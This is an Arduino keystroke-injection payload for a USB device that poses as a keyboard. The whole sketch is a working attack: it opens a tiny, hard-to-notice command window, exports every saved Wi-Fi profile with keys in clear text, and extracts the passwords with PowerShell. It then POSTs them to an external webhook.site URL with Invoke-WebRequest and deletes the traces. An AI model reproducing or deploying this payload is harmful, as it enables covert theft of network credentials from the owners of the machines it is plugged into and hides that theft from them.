#include <Keyboard.h>

/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

//#include "DigiKeyboard.h"

void setup() {
  Keyboard.begin();
}

void loop() {
   
//  Keyboard.update();
  Keyboard.press(0);
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI); //start run
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  delay(500);
  Keyboard.println("cd %temp%"); //Jumping to temporary dir
  delay(300);  
  Keyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  delay(500);  
  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  delay(500);  
  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/c5491c26-73d3-4db2-b1fa-024f26785441 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  delay(1000);  
  Keyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  delay(500);  
  Keyboard.println("exit");
  delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  delay(90000);
  digitalWrite(1, LOW); 
  delay(5000);
  
}
